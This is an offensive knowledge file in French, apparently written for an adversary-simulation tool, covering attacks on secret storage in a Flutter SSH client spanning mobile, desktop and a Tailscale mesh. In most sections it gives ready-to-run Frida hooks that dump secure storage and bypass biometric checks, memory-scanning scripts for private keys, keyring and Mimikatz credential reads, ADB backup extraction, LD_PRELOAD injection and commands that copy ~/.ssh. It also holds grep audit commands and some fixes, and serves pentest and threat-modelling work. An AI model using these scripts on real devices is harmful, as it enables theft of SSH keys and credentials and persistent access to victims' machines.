# Attaques Stockage et Cles -- Base de connaissance offensive
# Skill : adversary-simulation | Fichier knowledge
# Architecture cible : Mobile (ChillShell) -> Tailscale mesh -> Desktop (Chill) -> SSH -> PC

> **Source** : Extractions de CYBERSEC_MOBILE.md et CYBERSEC_DESKTOP.md

---

## TABLE DES MATIERES

1. [flutter_secure_storage -- extraction mobile](#1--flutter_secure_storage--extraction-mobile)
2. [SharedPreferences en clair](#2--sharedpreferences-en-clair)
3. [Stockage desktop -- absence de Secure Enclave](#3--stockage-desktop--absence-de-secure-enclave)
4. [shared_preferences desktop -- fichiers JSON en clair](#4--shared_preferences-desktop--fichiers-json-en-clair)
5. [Extraction de cles en memoire (RAM)](#5--extraction-de-cles-en-memoire-ram)
6. [Cles dans les logs et crash dumps](#6--cles-dans-les-logs-et-crash-dumps)
7. [Contournement biometrique (local_auth)](#7--contournement-biometrique-local_auth)
8. [Extraction via backups (ADB, iCloud, Google Drive)](#8--extraction-via-backups)
9. [DLL Injection et LD_PRELOAD -- interception crypto](#9--dll-injection-et-ld_preload)
10. [Clipboard hijacking -- vol de cles copiees](#10--clipboard-hijacking)
11. [Platform Channels -- interception en transit](#11--platform-channels--interception-en-transit)
12. [Acces physique -- Juice Jacking et Evil Maid](#12--acces-physique)
13. [Absence de sandbox desktop](#13--absence-de-sandbox-desktop)
14. [Stockage des credentials Tailscale](#14--stockage-des-credentials-tailscale)
15. [Chaines d'attaque stockage/cles](#15--chaines-dattaque-stockagecles)

---

## 1 -- flutter_secure_storage -- extraction mobile

### Architecture

flutter_secure_storage utilise :
- **Android** : Android Keystore + EncryptedSharedPreferences (AES-256-GCM, cle protegee par le TEE)
- **iOS** : iOS Keychain (Secure Enclave quand disponible)

### Scenario d'attaque -- Android roote

```bash
# Frida hook sur flutter_secure_storage
frida -U -f com.example.chillshell -l hook_secure_storage.js

# Le script intercepte read() et write() pour capturer les cles en clair
```

```javascript
// hook_secure_storage.js
Java.perform(function() {
    var SecureStorage = Java.use('com.it_nomads.fluttersecurestorage.FlutterSecureStorage');
    SecureStorage.read.implementation = function(key) {
        var value = this.read(key);
        console.log('[SECURE_STORAGE READ] key=' + key + ' value=' + value);
        return value;
    };
});
```

### Scenario d'attaque -- iOS jailbreake

```bash
# Objection (Frida wrapper)
objection -g com.example.chillshell explore
ios keychain dump

# Resultat : toutes les entrees Keychain de l'app, incluant les cles SSH
```

### Impact

- Extraction de la cle SSH privee
- Extraction des tokens d'authentification Tailscale
- Acces permanent au PC cible

**Source** : CYBERSEC_MOBILE.md section 4.3

---

## 2 -- SharedPreferences en clair

### Vulnerabilite (CWE-312)

Sur Android, les SharedPreferences classiques sont stockees en XML dans `/data/data/<package>/shared_prefs/`. Lisibles avec root ou ADB.

### Ce que l'attaquant cherche

```bash
# Sur device roote
cat /data/data/com.example.chillshell/shared_prefs/*.xml

# Contenu type :
# <string name="ssh_host">192.168.1.100</string>
# <string name="ssh_port">22</string>
# <string name="ssh_username">admin</string>
# <string name="last_connected_ip">100.64.0.5</string>
```

### Audit

```bash
grep -rn "SharedPreferences\|shared_preferences\|setString\|getString" --include="*.dart" .
```

**Source** : CYBERSEC_MOBILE.md section 4.6

---

## 3 -- Stockage desktop -- absence de Secure Enclave

### Vulnerabilite CRITIQUE

Le desktop **n'a PAS** de Secure Enclave/StrongBox equivalent au mobile. Les alternatives sont significativement moins securisees :

| OS | Mecanisme | Securite |
|----|----------|----------|
| Windows | Credential Manager (via Platform Channels) | Moyenne -- accessible a l'utilisateur |
| Linux | libsecret (GNOME Keyring) | Faible -- deverrouille avec la session |
| macOS | Keychain | Moyenne -- accessible avec le mot de passe utilisateur |

### Scenario d'attaque -- Linux (GNOME Keyring)

```bash
# Le keyring est deverrouille automatiquement au login
# Tout processus de l'utilisateur y accede

# Via D-Bus
dbus-send --session --dest=org.freedesktop.secrets \
  /org/freedesktop/secrets/collection/login \
  org.freedesktop.Secret.Service.SearchItems \
  dict:string:string:"application","com.example.chill"

# Via secret-tool
secret-tool search --all application com.example.chill
```

### Scenario d'attaque -- Windows (Credential Manager)

```powershell
# PowerShell -- lire les credentials
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
  [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(
    (Get-StoredCredential -Target "com.example.chill").Password
  )
)

# Outil Mimikatz (si admin)
mimikatz.exe "vault::list" "vault::cred" "exit"
```

### Scenario d'attaque -- macOS (Keychain)

```bash
# Lire un item du Keychain
security find-generic-password -a "com.example.chill" -w
```

**Source** : CYBERSEC_DESKTOP.md sections 4.1, 10.1

---

## 4 -- shared_preferences desktop -- fichiers JSON en clair

### Vulnerabilite (CWE-312)

Sur desktop, shared_preferences stocke les donnees dans un fichier JSON **en clair** :

```
# Windows
%APPDATA%\com.example.chill\shared_preferences.json

# Linux
~/.local/share/com.example.chill/shared_preferences.json

# macOS
~/Library/Application Support/com.example.chill/shared_preferences.json
```

### Impact

Tout processus de l'utilisateur (pas besoin d'admin/root) peut lire ce fichier. Si des secrets y sont stockes par erreur (meme temporairement) -> extraction directe.

---

## 5 -- Extraction de cles en memoire (RAM)

### Le probleme du Garbage Collector Dart

Le GC Dart **copie les objets** dans differentes zones de la heap. Une cle privee SSH en `String` persiste indefiniment :

```
Heap Zone 1 : [... cle_privee_copie_1 ...]
Heap Zone 2 : [... cle_privee_copie_2 ... cle_privee_copie_3 ...]
Heap Zone 3 : [... cle_privee_originale ...]
```

### Techniques d'extraction

#### 5.1 Frida -- dump memoire cible

```javascript
Memory.scan(Process.enumerateRanges('rw-')[0].base,
  Process.enumerateRanges('rw-')[0].size,
  "2d2d2d2d2d424547494e", // "-----BEGIN" en hex
  {
    onMatch: function(address, size) {
      console.log('[CLE TROUVEE] Adresse: ' + address);
      console.log(hexdump(address, { length: 2048 }));
    },
    onComplete: function() { console.log('Scan termine'); }
  }
);
```

#### 5.2 gdbserver (Android root / Desktop)

```bash
gdbserver :1234 --attach $(pidof com.example.chillshell)
# Depuis GDB client
(gdb) dump memory heap.bin 0x<start> 0x<end>
strings heap.bin | grep -A5 "BEGIN.*PRIVATE"
```

#### 5.3 Desktop -- /proc/pid/mem (Linux)

```bash
PID=$(pidof chill)
cat /proc/$PID/maps
dd if=/proc/$PID/mem bs=1 skip=$((0xHEAP_START)) count=$((0xHEAP_SIZE)) of=heap.bin 2>/dev/null
strings heap.bin | grep -A5 "BEGIN.*PRIVATE"
```

### Le service SSH persistant amplifie le risque

Sur mobile, `flutter_foreground_task` maintient la session SSH en permanence. Les cles restent en memoire tant que le service tourne.

### Audit

```bash
# Verifier comment les cles sont manipulees
grep -rn "privateKey\|private_key\|sshKey\|ssh_key" --include="*.dart" .
# Verifier si les buffers sont zerofies
grep -rn "fillRange(0)\|fill(0)\|zeroize\|wipe\|clear\|dispose" --include="*.dart" .
# Verifier si String est utilise pour les cles (String est immutable en Dart)
grep -rn "String.*key\|key.*String\|String.*secret" --include="*.dart" .
```

**Source** : CYBERSEC_MOBILE.md sections 4.3, 4.8, 8.8

---

## 6 -- Cles dans les logs et crash dumps

### Vulnerabilite (CWE-532)

Les cles, tokens et secrets peuvent fuiter dans :
- Les logs de l'application (`print()`, `debugPrint()`)
- Les crash dumps (stack traces avec variables locales)
- Les logs systeme (logcat Android, Console macOS, journalctl Linux)
- Les rapports de crash tiers (Firebase Crashlytics, Sentry)

### Scenario d'attaque

```bash
# Android logcat
adb logcat | grep -iE "(key|token|secret|password|private|ssh)"

# Linux journalctl
journalctl --user -u com.example.chill | grep -iE "(key|token|secret|password)"
```

### Audit

```bash
grep -rn "print\|debugPrint\|log\.\|Logger" --include="*.dart" . | grep -iE "(key|token|secret|password|ssh|private)"
```

**Source** : CYBERSEC_MOBILE.md section 8.7, CYBERSEC_DESKTOP.md section 14.7

---

## 7 -- Contournement biometrique (local_auth)

### Faiblesse fondamentale

`local_auth` ne fait **que demander une verification biometrique** et retourne `true` ou `false`. C'est une **barriere UI**, pas une barriere crypto.

```dart
// VULNERABLE -- biometrie comme simple gate UI
final authenticated = await localAuth.authenticate(
  localizedReason: 'Authentifiez-vous pour acceder a SSH',
);
if (authenticated) {
  final key = await storage.read(key: 'ssh_private_key');
  // Un hook Frida force authenticate() a retourner true
}
```

### Hook Frida pour contourner local_auth

```javascript
Java.perform(function() {
    var BiometricPrompt = Java.use(
      'androidx.biometric.BiometricPrompt$AuthenticationCallback'
    );
    BiometricPrompt.onAuthenticationSucceeded.implementation = function(result) {
        console.log('[BYPASS] Biometrie contournee');
        this.onAuthenticationSucceeded(result);
    };
});
```

### Deepfake biometrique (2026)

L'IA generative cree des masques 3D ou videos deepfake haute fidelite pour tromper FaceID/TouchID.

### Ce qui devrait etre fait

La biometrie devrait **deverrouiller un CryptoObject** sur Android, qui exige une verification cryptographique materielle.

**Source** : CYBERSEC_MOBILE.md sections 6.4, 9.5

---

## 8 -- Extraction via backups

### Android -- ADB backup

```bash
# Si android:allowBackup="true" (DEFAUT !)
adb backup -apk -shared com.example.chillshell -f backup.ab
java -jar abe.jar unpack backup.ab backup.tar <password>
tar xf backup.tar
```

### Android -- Google Drive Auto-Backup

Android auto-backup vers Google Drive inclut les SharedPreferences. Compromission du compte Google -> extraction des secrets.

### iOS -- iTunes / iCloud

Les items Keychain avec `kSecAttrAccessibleAfterFirstUnlock` sont dans le backup. Seuls `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` sont exclus.

### Desktop

Pas de backup natif, mais Time Machine, Windows Backup, rsync/timeshift incluent les fichiers de l'app.

### Audit

```bash
# Android -- verifier allowBackup
grep -rn "allowBackup\|fullBackupContent\|dataExtractionRules" --include="*.xml" android/
```

**Source** : CYBERSEC_MOBILE.md section 4.11

---

## 9 -- DLL Injection et LD_PRELOAD

### DLL Injection (Windows)

```
Ordre de recherche DLL Windows :
1. Repertoire de l'executable       <-- ATTAQUANT place sa DLL ici
2. Repertoire systeme (System32)
3. Repertoire Windows
4. Repertoire courant
5. PATH
```

DLLs cibles : `version.dll`, `dwmapi.dll`, `winmm.dll`

### LD_PRELOAD (Linux)

```bash
LD_PRELOAD=/tmp/malicious.so /opt/chill/chill
# Intercepte les appels a libssl, glibc
# Capture les cles SSH avant le chiffrement
```

### DYLD_INSERT_LIBRARIES (macOS)

```bash
DYLD_INSERT_LIBRARIES=/tmp/malicious.dylib /Applications/Chill.app/Contents/MacOS/Chill
```

### Impact

Si le pont FFI charge une bibliotheque detournable, l'attaquant accede a flutter_secure_storage et aux cles SSH.

**Source** : CYBERSEC_DESKTOP.md sections 4.2, 4.3

---

## 10 -- Clipboard hijacking

### Vulnerabilite

Le presse-papier est accessible a **tout processus** sans protection native (surtout sur desktop).

```python
# Python -- lire le clipboard Windows
import win32clipboard
win32clipboard.OpenClipboard()
data = win32clipboard.GetClipboardData()
print(data)  # Cle SSH si l'utilisateur l'a copiee
```

### Audit

```bash
grep -rn "Clipboard\|clipboard\|copy\|paste\|ClipboardData" --include="*.dart" .
```

**Source** : CYBERSEC_MOBILE.md section 4.9, CYBERSEC_DESKTOP.md section 9.5

---

## 11 -- Platform Channels -- interception en transit

### Vulnerabilite

Les Platform Channels (MethodChannel, EventChannel) transmettent les donnees **en clair** entre Dart et le code natif.

```javascript
// Frida -- intercepter les Platform Channels Flutter
Java.perform(function() {
    var MethodChannel = Java.use('io.flutter.plugin.common.MethodChannel');
    MethodChannel.invokeMethod.overload(
      'java.lang.String', 'java.lang.Object',
      'io.flutter.plugin.common.MethodChannel$Result'
    ).implementation = function(method, arguments, callback) {
        console.log('[CHANNEL] Method: ' + method);
        console.log('[CHANNEL] Args: ' + JSON.stringify(arguments));
        return this.invokeMethod(method, arguments, callback);
    };
});
```

### Impact

- Vol des cles SSH pendant le transfert Dart -> natif
- Modification des commandes SSH avant execution
- Injection de reponses biometriques factices

**Source** : CYBERSEC_MOBILE.md section 4.4

---

## 12 -- Acces physique

### Juice Jacking / ChoiceJacking (Mobile)

Bornes de charge publiques, cables pieges (O.MG Cable). **ChoiceJacking (2025)** : le chargeur simule des entrees tactiles pour approuver ADB.

```bash
adb shell
adb pull /data/data/com.example.chillshell/ /tmp/stolen/
```

### Evil Maid Attack (Desktop)

```bash
# Boot USB live -> montage disque -> extraction
mount /dev/sda2 /mnt
cp /mnt/home/user/.ssh/* /tmp/stolen/
cp -r /mnt/home/user/.local/share/com.example.chill/ /tmp/stolen/
```

**Source** : CYBERSEC_MOBILE.md section 7.4, CYBERSEC_DESKTOP.md section 15.4

---

## 13 -- Absence de sandbox desktop

### Vulnerabilite CRITIQUE

Les apps Flutter Desktop n'ont **PAS de sandbox**. Si compromise, l'app accede a TOUT :

| Cible | Chemin | Contenu |
|-------|--------|---------|
| Cles SSH utilisateur | `~/.ssh/` | TOUTES les cles privees |
| Config SSH | `~/.ssh/config` | Hotes, utilisateurs, tunnels |
| Navigateur | `~/.config/google-chrome/` | Cookies, mots de passe |
| Documents | `~/Documents/` | Fichiers personnels |

**Source** : CYBERSEC_DESKTOP.md section 4.1

---

## 14 -- Stockage des credentials Tailscale

Les credentials Tailscale stockes sur le device :

```bash
# Localiser les fichiers d'etat Tailscale
find / -name "tailscaled.state" -o -name "*.tailscale*" 2>/dev/null
cat /var/lib/tailscale/tailscaled.state | jq .
```

Fuite via variables d'environnement (GHSA-qccm-wmcq-pwr6) et via logs (TS-2025-005).

**Source** : CYBERSEC_MOBILE.md sections 2.3, 2.5

---

## 15 -- Chaines d'attaque stockage/cles

### Chaine 1 : ADB backup + extraction

```
android:allowBackup="true" (defaut)
  -> adb backup -> extraction SharedPreferences
  -> si Keystore sauvegarde -> dechiffrement cles SSH
  -> acces SSH permanent
```

### Chaine 2 : Root + Frida + memoire

```
Device roote (Magisk/KernelSU)
  -> Frida hook flutter_secure_storage
  -> Interception cles SSH en clair
  -> OU dump memoire -> recherche patterns cles
  -> Acces SSH permanent
```

### Chaine 3 : DLL injection + crypto (Windows)

```
DLL malveillante (version.dll) dans le dossier de l'app
  -> Chargee au demarrage
  -> Intercepte FFI flutter_secure_storage
  -> Capture cles SSH -> exfiltre vers C2
```

### Chaine 4 : Biometrie bypass + vol de cles

```
Frida hook local_auth (retourne toujours true)
  -> Biometrie contournee
  -> Acces flutter_secure_storage
  -> Extraction cle SSH
  -> Commandes arbitraires sur le PC
```

### Chaine 5 : Evil Maid + absence de sandbox

```
Acces physique au PC eteint
  -> Boot USB live -> montage disque
  -> Copie ~/.ssh/ + donnees Chill
  -> Installation backdoor persistant
  -> Acces SSH permanent + surveillance
```

---

## Sources

- CYBERSEC_MOBILE.md -- Sections 4, 6, 7, 8, 9
- CYBERSEC_DESKTOP.md -- Sections 4, 8, 9, 10, 14, 15
- OWASP Mobile Top 10 : M9 Insecure Data Storage
- CWE-312 : Cleartext Storage of Sensitive Information
- CWE-316 : Cleartext Storage in Memory
- CWE-532 : Insertion of Sensitive Information into Log File
